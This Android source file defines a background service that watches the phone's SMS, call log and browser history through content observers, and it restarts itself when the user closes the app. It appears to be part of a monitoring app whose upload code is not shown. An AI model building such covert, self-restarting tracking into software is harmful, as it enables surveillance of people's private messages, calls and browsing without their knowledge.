package the5concurrentnodes.services;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.IBinder;

import java.util.Date;


import the5concurrentnodes.mmaData.Browser.BrowserConstants;
import the5concurrentnodes.mmaData.Browser.BrowserDefaultObserver;
import the5concurrentnodes.mmaData.Browser.BrowserObserver;
import the5concurrentnodes.mmaData.call.CallConstants;
import the5concurrentnodes.mmaData.call.CallObserver;
import the5concurrentnodes.mmaData.sms.SmsConstants;
import the5concurrentnodes.mmaData.sms.SmsObserver;

public class DataPushService extends Service{

    private  boolean serviceInitialized;
    private ContentResolver contentResolver;
    private SmsObserver smsObserver;
    private CallObserver callObserver;
    private BrowserObserver browserObserver;
    private BrowserDefaultObserver browserDefaultObserver;



    @Override
    public IBinder onBind(Intent intent) { return  null;}

        @Override
        public int onStartCommand(Intent intent, int flags, int startId) {

            if(!serviceInitialized) {

                smsObserver = new SmsObserver(getApplicationContext());
                callObserver = new CallObserver(getApplicationContext());
                browserObserver = new BrowserObserver(getApplicationContext());
                browserDefaultObserver = new BrowserDefaultObserver(getApplicationContext());

                contentResolver = getBaseContext().getContentResolver();
                contentResolver.registerContentObserver(Uri.parse(SmsConstants.CONTENT_SMS_URI), true, smsObserver);
                contentResolver.registerContentObserver(Uri.parse(CallConstants.CONTENT_CALL_URI), true,callObserver);
                contentResolver.registerContentObserver(Uri.parse(BrowserConstants.CHROME_CONTENT_URI),true,browserObserver);
                contentResolver.registerContentObserver(Uri.parse(BrowserConstants.CONTENT_DEFAULT_URI),true,browserDefaultObserver);

                serviceInitialized = true;

            }

            return  START_STICKY;
        }

        @Override
        public void onDestroy() {
            super.onDestroy();

            contentResolver.unregisterContentObserver(smsObserver);
            contentResolver.unregisterContentObserver(callObserver);
            contentResolver.unregisterContentObserver(browserObserver);
            contentResolver.unregisterContentObserver(browserDefaultObserver);
            serviceInitialized = false;
        }

        @Override
        public void onTaskRemoved(Intent rootIntent) {
            super.onTaskRemoved(rootIntent);
            restartService();
        }

        private void restartService() {

            Intent intent = new Intent(this, DataPushService.class);
            PendingIntent pendingIntent = PendingIntent.getService(this, 0, intent, 0);
            long now = new Date().getTime();

            AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            alarmManager.set(AlarmManager.RTC_WAKEUP, now + 1000, pendingIntent);
        }

}